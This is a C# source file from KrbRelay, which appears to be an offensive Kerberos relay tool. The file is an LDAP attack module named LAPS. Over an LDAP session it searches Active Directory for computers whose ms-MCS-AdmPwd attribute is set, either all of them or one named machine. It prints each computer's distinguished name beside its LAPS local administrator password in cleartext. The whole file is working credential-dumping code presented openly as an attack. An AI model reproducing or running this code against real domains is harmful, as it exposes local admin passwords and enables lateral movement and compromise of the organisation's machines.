using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using static KrbRelay.Natives;

namespace KrbRelay.Clients.Attacks.Ldap
{
    internal class LAPS
    {
        public static void read(IntPtr ld, string computer = "")
        {
            var timeout = new Natives.LDAP_TIMEVAL
            {
                tv_sec = (int)(new TimeSpan(0, 0, 30).Ticks / TimeSpan.TicksPerSecond)
            };
            IntPtr pLaps = Helpers.AllocHGlobalIntPtrArray(1 + 1);
            var controlPtr = Marshal.StringToHGlobalUni("ms-MCS-AdmPwd");
            Marshal.WriteIntPtr(pLaps, IntPtr.Size * 0, controlPtr);

            int search = 0;
            if (string.IsNullOrEmpty(computer))
            {
                search = Natives.ldap_search(
                    ld,
                    $"{Program.domainDN}",
                    (int)LdapSearchScope.LDAP_SCOPE_SUBTREE,
                    "(&(objectClass=computer)(ms-MCS-AdmPwd=*))",
                    pLaps,
                    0);
            }
            else
            {
                search = Natives.ldap_search(
                    ld,
                    $"{Program.domainDN}",
                    (int)LdapSearchScope.LDAP_SCOPE_SUBTREE,
                    String.Format("(&(objectClass=computer)(sAMAccountName={0}))", computer.ToUpper()),
                    pLaps,
                    0);
            }
            //Console.WriteLine("[*] msgID: {0}", search);

            IntPtr pMessage = IntPtr.Zero;
            var r = Natives.ldap_result(
                ld,
                search,
                1,
                timeout,
                ref pMessage);
            Console.WriteLine("[*] ldap_result: {0}", (LdapResultType)r);
            Dictionary<string, Dictionary<string, List<byte[]>>> result = new Dictionary<string, Dictionary<string, List<byte[]>>>();
            var ber = Marshal.AllocHGlobal(IntPtr.Size);
            for (var entry = Natives.ldap_first_entry(ld, pMessage); entry != IntPtr.Zero;
                entry = Natives.ldap_next_entry(ld, entry))
            {
                string dn = Generic.GetLdapDn(ld, entry);//.Split(',').First().Replace("CN=","");
                Dictionary<string, List<byte[]>> aa = Generic.GetLdapAttributes(ld, entry, ref ber);
                string password = Encoding.ASCII.GetString(aa.Values.SelectMany(a => a).ToArray().SelectMany(a => a).ToArray());
                Console.WriteLine("dn: {0, -60} {1}", dn, password);
            }
            return;
        }
    }
}